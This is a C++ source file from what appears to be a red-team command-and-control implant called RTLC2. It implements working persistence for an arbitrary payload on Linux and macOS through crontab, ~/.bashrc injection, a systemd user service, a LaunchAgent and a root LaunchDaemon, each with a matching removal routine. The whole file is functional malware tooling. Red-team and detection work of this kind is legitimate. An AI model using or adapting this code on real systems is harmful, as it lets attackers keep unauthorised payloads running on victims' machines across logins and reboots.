// persistence_posix.cpp - Linux and macOS persistence techniques
// Implements: Crontab, SystemdService (Linux), BashRC, LaunchAgent (macOS), LaunchDaemon (macOS)

#if defined(RTLC2_LINUX) || defined(RTLC2_MACOS)

#include "persistence.h"

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <fstream>
#include <sstream>
#include <string>
#include <sys/stat.h>
#include <unistd.h>

namespace rtlc2 {
namespace persistence {

// ---- Helpers ----

static std::string GetHomeDir() {
    const char* home = getenv("HOME");
    if (home) return std::string(home);
    return "/tmp";
}

static bool FileExists(const std::string& path) {
    struct stat st;
    return stat(path.c_str(), &st) == 0;
}

static bool MkdirP(const std::string& path) {
    // Simple recursive mkdir -p
    std::string cur;
    for (size_t i = 0; i < path.size(); i++) {
        cur += path[i];
        if (path[i] == '/' || i == path.size() - 1) {
            mkdir(cur.c_str(), 0755);
        }
    }
    struct stat st;
    return stat(path.c_str(), &st) == 0 && S_ISDIR(st.st_mode);
}

static std::string ExecCmd(const std::string& cmd) {
    FILE* fp = popen(cmd.c_str(), "r");
    if (!fp) return "";
    char buf[4096];
    std::string output;
    while (fgets(buf, sizeof(buf), fp)) {
        output += buf;
    }
    pclose(fp);
    return output;
}

static bool WriteFile(const std::string& path, const std::string& content) {
    std::ofstream f(path);
    if (!f.is_open()) return false;
    f << content;
    f.close();
    return true;
}

static std::string ReadFile(const std::string& path) {
    std::ifstream f(path);
    if (!f.is_open()) return "";
    std::ostringstream ss;
    ss << f.rdbuf();
    return ss.str();
}

// ====================================================================
// 1. Crontab
// ====================================================================

PersistResult InstallCrontab(const PersistConfig& cfg) {
    if (cfg.payload_path.empty()) {
        return {false, "Crontab: payload_path required", cfg.technique};
    }

    // Dump existing crontab
    std::string existing = ExecCmd("crontab -l 2>/dev/null");

    // Check if entry already exists
    std::string marker = "# RTLC2_PERSIST_" + cfg.name;
    if (existing.find(marker) != std::string::npos) {
        return {true, "Crontab entry already exists: " + cfg.name, cfg.technique};
    }

    // Build cron line
    std::string cronLine = "*/5 * * * * " + cfg.payload_path;
    if (!cfg.args.empty()) {
        cronLine += " " + cfg.args;
    }
    cronLine += " " + marker;

    // Append and reinstall
    std::string tmpFile = "/tmp/.rtlc2_cron_" + std::to_string(getpid());
    std::string newCrontab = existing;
    if (!newCrontab.empty() && newCrontab.back() != '\n') {
        newCrontab += '\n';
    }
    newCrontab += cronLine + "\n";

    if (!WriteFile(tmpFile, newCrontab)) {
        return {false, "Failed to write temp crontab file", cfg.technique};
    }

    std::string result = ExecCmd("crontab " + tmpFile + " 2>&1");
    unlink(tmpFile.c_str());

    // Verify
    std::string verify = ExecCmd("crontab -l 2>/dev/null");
    bool ok = verify.find(marker) != std::string::npos;

    return {ok, ok ? "Crontab entry installed: " + cfg.name
                   : "Failed to install crontab: " + result,
            cfg.technique};
}

PersistResult RemoveCrontab(const PersistConfig& cfg) {
    std::string existing = ExecCmd("crontab -l 2>/dev/null");
    std::string marker = "# RTLC2_PERSIST_" + cfg.name;

    if (existing.find(marker) == std::string::npos) {
        return {false, "Crontab entry not found: " + cfg.name, cfg.technique};
    }

    // Filter out lines containing the marker
    std::istringstream iss(existing);
    std::ostringstream oss;
    std::string line;
    while (std::getline(iss, line)) {
        if (line.find(marker) == std::string::npos) {
            oss << line << "\n";
        }
    }

    std::string tmpFile = "/tmp/.rtlc2_cron_" + std::to_string(getpid());
    std::string filtered = oss.str();

    if (filtered.empty() || (filtered.find_first_not_of(" \n\t\r") == std::string::npos)) {
        // Empty crontab - remove it entirely
        ExecCmd("crontab -r 2>/dev/null");
    } else {
        WriteFile(tmpFile, filtered);
        ExecCmd("crontab " + tmpFile + " 2>&1");
        unlink(tmpFile.c_str());
    }

    return {true, "Crontab entry removed: " + cfg.name, cfg.technique};
}

// ====================================================================
// 2. BashRC
// ====================================================================

PersistResult InstallBashRC(const PersistConfig& cfg) {
    if (cfg.payload_path.empty()) {
        return {false, "BashRC: payload_path required", cfg.technique};
    }

    std::string bashrcPath = GetHomeDir() + "/.bashrc";
    std::string existing = ReadFile(bashrcPath);

    std::string startMarker = "# RTLC2_PERSIST_START_" + cfg.name;
    std::string endMarker = "# RTLC2_PERSIST_END_" + cfg.name;

    // Check if already installed
    if (existing.find(startMarker) != std::string::npos) {
        return {true, "BashRC entry already exists: " + cfg.name, cfg.technique};
    }

    // Build block
    std::string block = "\n" + startMarker + "\n";
    block += "nohup " + cfg.payload_path;
    if (!cfg.args.empty()) {
        block += " " + cfg.args;
    }
    block += " > /dev/null 2>&1 &\n";
    block += endMarker + "\n";

    // Append to .bashrc
    std::ofstream f(bashrcPath, std::ios::app);
    if (!f.is_open()) {
        return {false, "Failed to open " + bashrcPath + " for writing", cfg.technique};
    }
    f << block;
    f.close();

    return {true, "BashRC persistence installed: " + cfg.name, cfg.technique};
}

PersistResult RemoveBashRC(const PersistConfig& cfg) {
    std::string bashrcPath = GetHomeDir() + "/.bashrc";
    std::string content = ReadFile(bashrcPath);

    std::string startMarker = "# RTLC2_PERSIST_START_" + cfg.name;
    std::string endMarker = "# RTLC2_PERSIST_END_" + cfg.name;

    auto startPos = content.find(startMarker);
    if (startPos == std::string::npos) {
        return {false, "BashRC entry not found: " + cfg.name, cfg.technique};
    }

    auto endPos = content.find(endMarker, startPos);
    if (endPos == std::string::npos) {
        return {false, "BashRC end marker not found (corrupted?)", cfg.technique};
    }

    // Find the newline after the end marker
    auto lineEnd = content.find('\n', endPos);
    if (lineEnd != std::string::npos) {
        lineEnd++; // Include the newline
    } else {
        lineEnd = content.size();
    }

    // Also remove any blank line before the start marker
    if (startPos > 0 && content[startPos - 1] == '\n') {
        startPos--;
    }

    std::string cleaned = content.substr(0, startPos) + content.substr(lineEnd);

    if (!WriteFile(bashrcPath, cleaned)) {
        return {false, "Failed to write cleaned .bashrc", cfg.technique};
    }

    return {true, "BashRC persistence removed: " + cfg.name, cfg.technique};
}

// ====================================================================
// 3. Systemd User Service (Linux only)
// ====================================================================
#ifdef RTLC2_LINUX

PersistResult InstallSystemdService(const PersistConfig& cfg) {
    if (cfg.payload_path.empty()) {
        return {false, "SystemdService: payload_path required", cfg.technique};
    }

    std::string unitDir = GetHomeDir() + "/.config/systemd/user";
    MkdirP(unitDir);

    std::string unitName = cfg.name + ".service";
    std::string unitPath = unitDir + "/" + unitName;

    // Build unit file
    std::ostringstream unit;
    unit << "[Unit]\n";
    unit << "Description=" << cfg.name << "\n";
    unit << "After=default.target\n";
    unit << "\n";
    unit << "[Service]\n";
    unit << "Type=simple\n";
    unit << "ExecStart=" << cfg.payload_path;
    if (!cfg.args.empty()) {
        unit << " " << cfg.args;
    }
    unit << "\n";
    unit << "Restart=on-failure\n";
    unit << "RestartSec=30\n";
    unit << "\n";
    unit << "[Install]\n";
    unit << "WantedBy=default.target\n";

    if (!WriteFile(unitPath, unit.str())) {
        return {false, "Failed to write unit file: " + unitPath, cfg.technique};
    }

    // Reload and enable
    ExecCmd("systemctl --user daemon-reload 2>&1");
    std::string enableOut = ExecCmd("systemctl --user enable " + unitName + " 2>&1");
    std::string startOut = ExecCmd("systemctl --user start " + unitName + " 2>&1");

    return {true, "Systemd user service installed and enabled: " + unitName, cfg.technique};
}

PersistResult RemoveSystemdService(const PersistConfig& cfg) {
    std::string unitName = cfg.name + ".service";
    std::string unitDir = GetHomeDir() + "/.config/systemd/user";
    std::string unitPath = unitDir + "/" + unitName;

    // Stop and disable
    ExecCmd("systemctl --user stop " + unitName + " 2>&1");
    ExecCmd("systemctl --user disable " + unitName + " 2>&1");

    // Remove unit file
    if (unlink(unitPath.c_str()) != 0 && FileExists(unitPath)) {
        return {false, "Failed to remove unit file: " + unitPath, cfg.technique};
    }

    ExecCmd("systemctl --user daemon-reload 2>&1");

    return {true, "Systemd user service removed: " + unitName, cfg.technique};
}

#endif // RTLC2_LINUX

// ====================================================================
// 4. LaunchAgent (macOS only)
// ====================================================================
#ifdef RTLC2_MACOS

static std::string BuildPlist(const PersistConfig& cfg) {
    std::ostringstream plist;
    plist << "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n";
    plist << "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" "
          << "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n";
    plist << "<plist version=\"1.0\">\n";
    plist << "<dict>\n";
    plist << "    <key>Label</key>\n";
    plist << "    <string>com." << cfg.name << ".plist</string>\n";
    plist << "    <key>ProgramArguments</key>\n";
    plist << "    <array>\n";
    plist << "        <string>" << cfg.payload_path << "</string>\n";
    if (!cfg.args.empty()) {
        // Split args by spaces (simple split)
        std::istringstream argStream(cfg.args);
        std::string arg;
        while (argStream >> arg) {
            plist << "        <string>" << arg << "</string>\n";
        }
    }
    plist << "    </array>\n";
    plist << "    <key>RunAtLoad</key>\n";
    plist << "    <true/>\n";
    plist << "    <key>KeepAlive</key>\n";
    plist << "    <true/>\n";
    plist << "</dict>\n";
    plist << "</plist>\n";
    return plist.str();
}

PersistResult InstallLaunchAgent(const PersistConfig& cfg) {
    if (cfg.payload_path.empty()) {
        return {false, "LaunchAgent: payload_path required", cfg.technique};
    }

    std::string agentDir = GetHomeDir() + "/Library/LaunchAgents";
    MkdirP(agentDir);

    std::string plistName = "com." + cfg.name + ".plist";
    std::string plistPath = agentDir + "/" + plistName;

    std::string plistContent = BuildPlist(cfg);
    if (!WriteFile(plistPath, plistContent)) {
        return {false, "Failed to write plist: " + plistPath, cfg.technique};
    }

    // Load the agent
    ExecCmd("launchctl load -w " + plistPath + " 2>&1");

    return {true, "LaunchAgent installed: " + plistPath, cfg.technique};
}

PersistResult RemoveLaunchAgent(const PersistConfig& cfg) {
    std::string agentDir = GetHomeDir() + "/Library/LaunchAgents";
    std::string plistName = "com." + cfg.name + ".plist";
    std::string plistPath = agentDir + "/" + plistName;

    // Unload
    ExecCmd("launchctl unload " + plistPath + " 2>&1");

    // Delete
    if (unlink(plistPath.c_str()) != 0 && FileExists(plistPath)) {
        return {false, "Failed to remove plist: " + plistPath, cfg.technique};
    }

    return {true, "LaunchAgent removed: " + plistPath, cfg.technique};
}

// ====================================================================
// 5. LaunchDaemon (macOS only - requires root)
// ====================================================================

PersistResult InstallLaunchDaemon(const PersistConfig& cfg) {
    if (cfg.payload_path.empty()) {
        return {false, "LaunchDaemon: payload_path required", cfg.technique};
    }

    if (geteuid() != 0) {
        return {false, "LaunchDaemon requires root privileges", cfg.technique};
    }

    std::string daemonDir = "/Library/LaunchDaemons";
    MkdirP(daemonDir);

    std::string plistName = "com." + cfg.name + ".plist";
    std::string plistPath = daemonDir + "/" + plistName;

    std::string plistContent = BuildPlist(cfg);
    if (!WriteFile(plistPath, plistContent)) {
        return {false, "Failed to write daemon plist: " + plistPath, cfg.technique};
    }

    // Set ownership and permissions
    chown(plistPath.c_str(), 0, 0); // root:wheel
    chmod(plistPath.c_str(), 0644);

    // Load the daemon
    ExecCmd("launchctl load -w " + plistPath + " 2>&1");

    return {true, "LaunchDaemon installed: " + plistPath, cfg.technique};
}

PersistResult RemoveLaunchDaemon(const PersistConfig& cfg) {
    if (geteuid() != 0) {
        return {false, "LaunchDaemon removal requires root privileges", cfg.technique};
    }

    std::string plistName = "com." + cfg.name + ".plist";
    std::string plistPath = "/Library/LaunchDaemons/" + plistName;

    // Unload
    ExecCmd("launchctl unload " + plistPath + " 2>&1");

    // Delete
    if (unlink(plistPath.c_str()) != 0 && FileExists(plistPath)) {
        return {false, "Failed to remove daemon plist: " + plistPath, cfg.technique};
    }

    return {true, "LaunchDaemon removed: " + plistPath, cfg.technique};
}

#endif // RTLC2_MACOS

} // namespace persistence
} // namespace rtlc2

#endif // RTLC2_LINUX || RTLC2_MACOS
